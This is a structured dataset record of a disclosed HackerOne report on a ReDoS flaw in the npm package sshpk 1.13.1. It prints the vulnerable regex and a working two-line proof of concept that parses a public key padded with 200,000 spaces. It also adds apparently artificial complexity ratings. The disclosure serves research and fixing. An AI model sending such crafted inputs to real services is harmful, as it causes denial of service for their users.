{
  "reported_to": "Node.js third-party modules",
  "reported_by": "chalker ",
  "title": "`sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys",
  "content": "\nI would like to report a ReDoS in sshpk\nIt allows to cause Denial of Service by trying to parse a crafted public key.\nModule\nmodule name: sshpk\nversion: 1.13.1\nnpm page: https://www.npmjs.com/package/sshpk\nModule Description\nParse, convert, fingerprint and use SSH keys (both public and private) in pure node -- no ssh-keygen or other external dependencies.\nModule Stats\n320 485 downloads in the last day\n4 709 033 downloads in the last week\n19 365 516 downloads in the last month\n~232 386 192 estimated downloads per year\nVulnerability\nVulnerability Description\nReDoS.\nregex: /^([a-z0-9-]+)[ \\t]+([a-zA-Z0-9+\\/]+[=]*)([\\n \\t]+([^\\n]+))?$/\nevil string: ssh-rsa a${Array(200000).join(' ')}x\\nx (~200 KB, unwrap js template string)\nfile: https://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17\nThe testcase uses ~200 KB string to demonstrate long unavailability period, but parsing is also considerably slow on shorter strings.\nSteps To Reproduce:\nCode 107 Bytes\n1var keyPub = `ssh-rsa a${Array(200000).join(' ')}x\\nx`;\n2var key = require('sshpk').parseKey(keyPub, 'ssh');\nSupporting Material/References:\nArch Linux Current\nNode.js 9.5.0\nnpm 5.6.0\nWrap up\nI contacted the maintainer to let him know: N\nI opened an issue in the related repository: N\nImpact\nCause denial of service by parsing a crafted public key file.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1522891560,
  "report_url": "https://hackerone.com/reports/319593",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a malicious public key string with excessive whitespace: `ssh-rsa a${Array(200000).join(' ')}x\\nx`"
    ],
    [
      2,
      "Parse the malicious key using sshpk: `require('sshpk').parseKey(keyPub, 'ssh')`"
    ]
  ],
  "vuln_description": "The `sshpk` library is vulnerable to Regular Expression Denial of Service (ReDoS) when parsing specially crafted invalid public keys. The vulnerability stems from inefficient regex processing of whitespace in malformed keys, causing significant CPU consumption.",
  "reason": "The vulnerability requires only basic knowledge of ReDoS patterns and standard public key formats. The attack vector is straightforward - crafting a key with excessive whitespace to trigger inefficient regex processing. No complex interactions or state manipulation is needed.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}